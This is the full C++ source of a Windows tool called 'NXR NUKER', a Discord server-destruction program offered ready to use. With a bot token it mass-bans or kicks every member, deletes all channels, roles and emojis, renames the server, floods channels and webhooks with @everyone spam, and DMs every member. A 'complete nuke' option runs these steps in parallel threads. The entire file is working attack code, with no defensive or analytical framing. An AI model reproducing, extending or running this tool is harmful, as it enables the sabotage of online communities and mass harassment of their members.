#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>
#include <sstream>
#include <chrono>
#include <random>
#include <mutex>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

std::string g_token, g_guild;
std::string g_credit = "NXR NUKER";
std::string g_spam_msg = "@everyone SERVER DESTROYED BY NXR";
std::string g_dm_msg = "Your server got destroyed by NXR NUKER";
std::string g_webhook_msg = "@everyone NXR WEBHOOK SPAM";
std::string g_new_server_name = "NXR DESTROYED";
std::string g_channel_prefix = "nxr-nuke-";
std::string g_role_prefix = "NXR-ROLE-";
int g_spam_per_channel = 100;
int g_channels_to_create = 40;
int g_roles_to_create = 25;
bool g_in_server = false;
std::mutex print_mtx;
std::mt19937 rng{std::random_device{}()};

void set_color(int c) { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c); }

void log(const std::string& s, int color = 12) {
    std::lock_guard<std::mutex> lk(print_mtx);
    set_color(color);
    std::cout << s << std::endl;
    set_color(7);
}

// ===================== FIXED HTTP (real method support) =====================
std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    std::string host = "discord.com";
    std::string path = "/api/v10" + endpoint;

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) NXR/5.1",
                                        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(),
                                          NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Authorization: Bot " + g_token + "\r\n"
                          "Content-Type: application/json\r\n"
                          "User-Agent: NXR-NUKER/5.1\r\n";

    BOOL sent = FALSE;
    if (!body.empty()) {
        sent = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
                                (LPVOID)body.c_str(), (DWORD)body.length());
    } else {
        sent = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), NULL, 0);
    }

    std::string resp;
    if (sent) {
        char buf[8192];
        DWORD read = 0;
        while (InternetReadFile(hRequest, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = 0;
            resp += buf;
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // small jitter
    std::this_thread::sleep_for(std::chrono::milliseconds(30 + (rng() % 50)));
    return resp;
}

std::vector<std::string> extract_ids(const std::string& json) {
    std::vector<std::string> ids;
    size_t pos = 0;
    while ((pos = json.find("\"id\":\"", pos)) != std::string::npos) {
        pos += 6;
        size_t end = json.find("\"", pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end;
        } else break;
    }
    return ids;
}

std::string extract_username(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find("\"", pos);
    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
}

void banner() {
    system("cls");
    set_color(15);
    std::cout << R"(
    ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
)" << std::endl;
    set_color(12);
    std::cout << "                 NXR NUKER  -  PRO v5.1  |  FIXED HTTP\n";
    std::cout << "                    Real Requests - All Methods Working\n\n";
    set_color(7);
}

void status_bar() {
    set_color(12);
    std::cout << "Status: ";
    if (g_in_server) { set_color(10); std::cout << "In Server"; }
    else { set_color(12); std::cout << "X Not in server"; }
    set_color(12);
    std::cout << " | Token: BOT\n";
    std::cout << "================================================================\n";
    set_color(7);
}

// ===================== WORKING FUNCTIONS =====================

void mass_ban() {
    log("[i] Collecting members...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int p = 0; p < 200; ++p) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = extract_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        log("[i] Collected " + std::to_string(members.size()), 11);
        if (ids.size() < 100) break;
    }
    log("[!] Banning " + std::to_string(members.size()) + " members...", 12);
    std::vector<std::thread> pool;
    for (auto& uid : members) {
        pool.emplace_back([uid]() {
            std::string info = http("GET", "/users/" + uid);
            std::string name = extract_username(info);
            std::string body = "{\"delete_message_days\":7,\"reason\":\"" + g_credit + "\"}";
            http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
            log("[+] BANNED " + name + " | " + uid, 10);
        });
        if (pool.size() >= 15) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    log("[+] Mass ban done", 10);
}

void mass_kick() {
    log("[i] Mass kick...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int p = 0; p < 200; ++p) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = extract_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        if (ids.size() < 100) break;
    }
    std::vector<std::thread> pool;
    for (auto& uid : members) {
        pool.emplace_back([uid]() {
            http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
            log("[+] KICKED " + uid, 10);
        });
        if (pool.size() >= 12) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void delete_all_channels() {
    log("[i] Deleting channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp);
    std::vector<std::thread> pool;
    for (auto& id : channels) {
        pool.emplace_back([id]() {
            http("DELETE", "/channels/" + id);
            log("[+] Deleted channel " + id, 10);
        });
        if (pool.size() >= 10) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void delete_all_roles() {
    log("[i] Deleting roles...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
    auto roles = extract_ids(resp);
    for (auto& id : roles) {
        if (id == g_guild) continue;
        http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
        log("[+] Deleted role " + id, 10);
    }
}

void delete_all_emojis() {
    log("[i] Deleting emojis...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/emojis");
    auto emojis = extract_ids(resp);
    for (auto& id : emojis) {
        http("DELETE", "/guilds/" + g_guild + "/emojis/" + id);
        log("[+] Deleted emoji " + id, 10);
    }
}

void create_channels() {
    log("[i] Creating channels...", 11);
    for (int i = 0; i < g_channels_to_create; ++i) {
        std::string body = "{\"name\":\"" + g_channel_prefix + std::to_string(i) + "\",\"type\":0}";
        http("POST", "/guilds/" + g_guild + "/channels", body);
        log("[+] Created " + g_channel_prefix + std::to_string(i), 10);
    }
}

void create_roles() {
    log("[i] Creating roles...", 11);
    for (int i = 0; i < g_roles_to_create; ++i) {
        std::string body = "{\"name\":\"" + g_role_prefix + std::to_string(i) + "\",\"color\":16711680}";
        http("POST", "/guilds/" + g_guild + "/roles", body);
        log("[+] Created role " + g_role_prefix + std::to_string(i), 10);
    }
}

void rename_server() {
    log("[i] Renaming server...", 11);
    std::string body = "{\"name\":\"" + g_new_server_name + "\"}";
    http("PATCH", "/guilds/" + g_guild, body);
    log("[+] Server renamed", 10);
}

void spam_channels() {
    log("[i] Spamming channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp);
    std::vector<std::thread> pool;
    for (auto& ch : channels) {
        pool.emplace_back([ch]() {
            for (int i = 0; i < g_spam_per_channel; ++i) {
                std::string body = "{\"content\":\"" + g_spam_msg + " | " + g_credit + "\"}";
                http("POST", "/channels/" + ch + "/messages", body);
            }
            log("[+] Spam done on " + ch, 10);
        });
        if (pool.size() >= 8) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void webhook_spam() {
    log("[i] Webhook spam...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp);
    for (auto& ch : channels) {
        for (int i = 0; i < 3; ++i) {
            std::string body = "{\"name\":\"nxr-hook-" + std::to_string(i) + "\"}";
            http("POST", "/channels/" + ch + "/webhooks", body);
        }
        for (int s = 0; s < 20; ++s) {
            std::string body = "{\"content\":\"" + g_webhook_msg + "\"}";
            http("POST", "/channels/" + ch + "/messages", body);
        }
        log("[+] Webhook spam on " + ch, 10);
    }
}

void dm_everyone() {
    log("[i] DM Everyone (slow)...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int p = 0; p < 50; ++p) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = extract_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        if (ids.size() < 100) break;
    }
    for (auto& uid : members) {
        std::string body = "{\"recipient_id\":\"" + uid + "\"}";
        std::string dm = http("POST", "/users/@me/channels", body);
        auto chs = extract_ids(dm);
        if (!chs.empty()) {
            std::string msg = "{\"content\":\"" + g_dm_msg + "\"}";
            http("POST", "/channels/" + chs[0] + "/messages", msg);
            log("[+] DM sent " + uid, 10);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(800));
    }
}

void complete_nuke() {
    log("[!] COMPLETE NUKE STARTED", 12);
    rename_server();
    std::thread t1(delete_all_channels);
    std::thread t2(delete_all_roles);
    std::thread t3(delete_all_emojis);
    t1.join(); t2.join(); t3.join();
    std::thread t4(create_channels);
    std::thread t5(create_roles);
    std::thread t6(mass_ban);
    std::thread t7(spam_channels);
    t4.join(); t5.join(); t6.join(); t7.join();
    log("[!] COMPLETE NUKE FINISHED", 10);
}

void diagnostics() {
    log("[i] Checking...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild);
    if (resp.find("\"id\"") != std::string::npos) {
        g_in_server = true;
        log("[+] Bot is in the server", 10);
    } else {
        g_in_server = false;
        log("[!] Not in server or bad token/guild ID", 12);
        log("[debug] Response: " + resp.substr(0, 200), 8);
    }
}

void customize() {
    std::cout << "Credit: "; std::getline(std::cin, g_credit);
    std::cout << "Spam msg: "; std::getline(std::cin, g_spam_msg);
    std::cout << "New server name: "; std::getline(std::cin, g_new_server_name);
    std::cout << "Channel prefix: "; std::getline(std::cin, g_channel_prefix);
    std::cout << "Spam count: "; std::cin >> g_spam_per_channel;
}

int main() {
    SetConsoleTitleA("NXR NUKER v5.1 FIXED - Real HTTP Methods");
    system("color 0C");

    banner();
    set_color(15);
    std::cout << "Bot Token : "; std::getline(std::cin, g_token);
    std::cout << "Guild ID  : "; std::getline(std::cin, g_guild);
    set_color(7);

    diagnostics();

    while (true) {
        banner();
        status_bar();
        set_color(12);
        std::cout << " (1) Ban Members          (2) Kick Members\n";
        std::cout << " (3) Delete Channels      (4) Delete Roles\n";
        std::cout << " (5) Delete Emojis        (6) Create Channels\n";
        std::cout << " (7) Create Roles         (8) Rename Server\n";
        std::cout << " (9) Spam Channels       (10) Webhook Spam\n";
        std::cout << "(11) DM Everyone         (12) Complete Nuke\n";
        std::cout << "(13) Diagnostics         (14) Customize\n";
        std::cout << "(0) Exit\n";
        set_color(7);
        std::cout << "\nSelect: ";
        int c; std::cin >> c; std::cin.ignore();

        switch (c) {
            case 1: mass_ban(); break;
            case 2: mass_kick(); break;
            case 3: delete_all_channels(); break;
            case 4: delete_all_roles(); break;
            case 5: delete_all_emojis(); break;
            case 6: create_channels(); break;
            case 7: create_roles(); break;
            case 8: rename_server(); break;
            case 9: spam_channels(); break;
            case 10: webhook_spam(); break;
            case 11: dm_everyone(); break;
            case 12: complete_nuke(); break;
            case 13: diagnostics(); break;
            case 14: customize(); break;
            case 0: return 0;
        }
        std::cout << "\nPress Enter..."; std::cin.get();
    }
    return 0;
}
